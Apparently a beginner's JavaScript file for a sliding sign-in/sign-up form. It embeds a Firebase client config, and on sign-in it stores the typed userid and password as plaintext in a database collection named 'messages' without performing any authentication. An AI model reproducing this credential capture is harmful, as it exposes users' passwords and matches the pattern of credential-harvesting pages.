
var x = document.getElementById("signin");
var y = document.getElementById("signup");
var z = document.getElementById("btn");

function signup(){
    x.style.left ="-400px";
    y.style.left ="50px";
    z.style.left = "110px";
}
function signin(){
    x.style.left ="50px";
    y.style.left ="450px";
    z.style.left = "0px";
}





// Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyDd8G12pHrGX8I2d4U-3UP-Pb1DcHaOfa0",
    authDomain: "signup-form-3fe44.firebaseapp.com",
    databaseURL: "https://signup-form-3fe44-default-rtdb.firebaseio.com",
    projectId: "signup-form-3fe44",
    storageBucket: "signup-form-3fe44.appspot.com",
    messagingSenderId: "711690894635",
    appId: "1:711690894635:web:08ee001269fc88533bd96e",
    measurementId: "G-VWGZ4DPY68"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  

  // Reference messages collection
var messagesRef = firebase.database().ref('messages');

//Listen for form submit
document.getElementById('signin').addEventListener('submit',submitForm);

//Submit Form
function submitForm(e){
    e.preventDefault();
    var userid= getInputVal('userid');
    var password= getInputVal('password');
    
    //save Message
    saveMessage(userid,password);

    //Clear Form
    document.getElementById('signin').reset();
}
//Funtion to get form inputs
function getInputVal(id){
    return document.getElementById(id).value;
}

//save message to firebase
function saveMessage(userid,password){
    
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        userid: userid,
        password: password,
        

    }).then(function(){console.log('success')}).catch(function(error){console.log('error',error)});
}


